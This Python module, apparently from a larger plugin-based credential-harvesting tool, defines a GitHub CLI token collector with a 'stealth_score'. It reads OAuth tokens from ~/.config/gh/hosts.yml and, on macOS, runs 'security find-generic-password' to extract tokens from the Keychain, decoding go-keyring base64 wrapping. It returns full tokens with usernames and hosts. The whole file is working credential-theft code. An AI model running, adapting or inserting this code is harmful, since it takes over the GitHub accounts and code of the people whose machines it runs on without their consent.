"""GitHub CLI (gh) token collector — parses ~/.config/gh/hosts.yml with regex.

Modern gh CLI stores tokens in macOS Keychain (security find-generic-password)
rather than in the YAML file.  This collector checks both locations.
"""

from __future__ import annotations

import base64
import re
import subprocess
from typing import List, Optional

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import gh_cli_dir, get_platform


@CollectorRegistry.register
class GhCliCollector(BaseCollector):
    service = "github"
    source = "gh_cli"
    stealth_score = 5

    def _hosts_path(self):
        return gh_cli_dir() / "hosts.yml"

    @staticmethod
    def _read_keychain(host: str) -> Optional[str]:
        """Read GitHub CLI token from macOS Keychain (gh: prefixed entries).

        gh CLI stores tokens via go-keyring which may base64-wrap the value
        with a ``go-keyring-base64:`` prefix.  We detect and decode that.
        """
        if get_platform() != "macos":
            return None
        try:
            result = subprocess.run(
                ["security", "find-generic-password", "-s", f"gh:{host}", "-w"],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode == 0 and result.stdout.strip():
                raw = result.stdout.strip()
                # go-keyring stores base64-encoded values with a prefix
                if raw.startswith("go-keyring-base64:"):
                    encoded = raw[len("go-keyring-base64:"):]
                    return base64.b64decode(encoded).decode("utf-8")
                return raw
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        return None

    def _parse_hosts_yml(self, text: str) -> list:
        """Parse hosts.yml using regex — no PyYAML dependency.

        Format:
        github.com:
            user: username
            oauth_token: gho_xxxxx
            git_protocol: https
        """
        entries = []
        current_host = None
        current_data = {}

        for line in text.splitlines():
            # Top-level host key (no leading whitespace)
            host_match = re.match(r'^(\S+):\s*$', line)
            if host_match:
                if current_host and current_data:
                    entries.append((current_host, current_data))
                current_host = host_match.group(1)
                current_data = {}
                continue

            # Indented key-value pair
            kv_match = re.match(r'^\s+(\w+):\s*(.+)$', line)
            if kv_match and current_host:
                current_data[kv_match.group(1)] = kv_match.group(2).strip()

        if current_host and current_data:
            entries.append((current_host, current_data))

        return entries

    def discover(self) -> List[DiscoveredToken]:
        results = []
        path = self._hosts_path()
        if not path.exists():
            return results

        try:
            text = path.read_text()
            entries = self._parse_hosts_yml(text)

            for host, data in entries:
                token = data.get("oauth_token", "")
                user = data.get("user", "unknown")

                if token:
                    token_preview = f"{token[:8]}..." if len(token) > 8 else "present"
                    details = f"token={token_preview}"
                else:
                    # Check if token is in macOS Keychain
                    keychain_token = self._read_keychain(host)
                    if keychain_token:
                        details = f"token in keychain (extractable, {keychain_token[:8]}...)"
                    else:
                        details = "token in system keyring (not extractable)"

                results.append(DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(path),
                    account_hint=f"{user}@{host}",
                    stealth_score=self.stealth_score,
                    details=details,
                ))
        except Exception as e:
            self._warn(f"Failed to parse {path}: {e}")

        return results

    def collect(self) -> List[CollectedToken]:
        results = []
        path = self._hosts_path()
        if not path.exists():
            return results

        try:
            text = path.read_text()
            entries = self._parse_hosts_yml(text)

            for host, data in entries:
                token = data.get("oauth_token")
                token_source = "yaml"

                # Fall back to macOS Keychain if token not in YAML
                if not token:
                    token = self._read_keychain(host)
                    token_source = "keychain"

                if not token:
                    continue

                user = data.get("user", "unknown")
                protocol = data.get("git_protocol", "https")

                results.append(CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    username=user,
                    access_token=secure(token),
                    extra={
                        "host": host,
                        "git_protocol": protocol,
                        "token_source": token_source,
                    },
                ))
        except Exception as e:
            self._warn(f"Failed to collect from {path}: {e}")

        return results
